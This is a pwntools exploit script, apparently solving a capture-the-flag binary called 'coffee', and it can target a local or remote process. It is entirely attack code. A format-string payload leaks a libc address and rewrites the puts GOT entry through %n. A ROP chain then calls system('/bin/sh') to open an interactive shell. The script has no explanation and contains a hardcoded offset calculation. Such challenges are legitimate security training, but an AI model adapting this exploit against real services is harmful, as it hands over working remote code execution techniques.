from elftools.construct import lib
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main+52
continue
'''.format(**locals())

exe = './challenge/coffee'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
p = start()

pop_rdi_ret = 0x401293
pop5 = 0x40128b

# leak libc
payload =  b'%29$016p'
# overwrite got puts to entrypoint
payload += b'%4199035c%9$naaa'
payload += p64(elf.got.puts)
payload += p64(elf.entrypoint)

p.sendline(payload)
leak = int(p.recvline()[:16], 16)

info("Leak libc: " + hex(leak))
libc.address = leak - (libc.sym.system -159696)

p.sendline(flat(
    p64(0)*4,                           # just padding
    pop_rdi_ret,
    next(libc.search(b'/bin/sh\x00')),
    libc.sym.system
))

p.interactive()
